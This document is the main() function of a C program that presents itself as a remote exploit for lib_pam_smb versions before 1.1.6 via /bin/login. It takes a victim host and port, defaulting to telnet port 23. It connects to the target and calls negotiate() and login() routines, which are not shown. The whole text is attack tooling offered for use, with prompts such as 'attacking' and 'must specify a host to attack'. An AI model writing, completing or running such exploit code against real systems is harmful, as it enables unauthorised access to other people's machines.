int main(int argc,char **argv)
{
        struct sockaddr_in sock;
        struct hostent *pHe;
        int sd;   
	short port = -1;
	int x;
	char *host = NULL;
	char *user = NULL;
	char exp[1024]; 
	int a;
	char *default_port = "23";

	printf("linux_pam_smb\n");
	printf("Linux lib_pam_smb < 1.1.6 /bin/login remote exploit\n");
	printf("[vertex//lids/org]\n\n");
	if (argc < 2) 
	{
		printf("%s -h <victim> [-p port] \n",argv[0]);
		return 0;
	}
	while ((a = getopt(argc,argv,"h:p:u:")) != -1)
	{
		switch (a)	
		{
			case 'h':
				host = optarg;
				break;
			
                        case 'p':
                                port = atoi(optarg);
                                break;

			default:
				printf("[-] invalid option.\n");
				break;
		}
	}
	if (host == NULL)
	{
		printf("[-] must specify a host to attack\n"); 
		return 0;
        }
	if (port < 0)
		port = atoi(default_port);
	if ((pHe = gethostbyname(host)) == NULL)
        {
                printf("Host lookup error.\n");
                return 0;
        }
	printf("[*] attacking %s:%d\n",host,port);
	printf("[*] opening socket\n");
        if ((sd = socket(AF_INET,SOCK_STREAM,0)) == -1)
        {
                printf("[-] could not create socket");
                return 0;
        }
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	memcpy(&sock.sin_addr.s_addr,pHe->h_addr,pHe->h_length);
	if ((connect(sd,(struct sockaddr *)&sock,sizeof(sock))) == -1)
        {
                printf("[-] failed to connect to %s\n",host);  
                return 0;
        }
	printf("[*] connected!\n");
	printf("[*] Begin negotiate... \n");
	negotiate(sd);
	printf("[*] Login... \n");
	login(sd);
	return 0;
}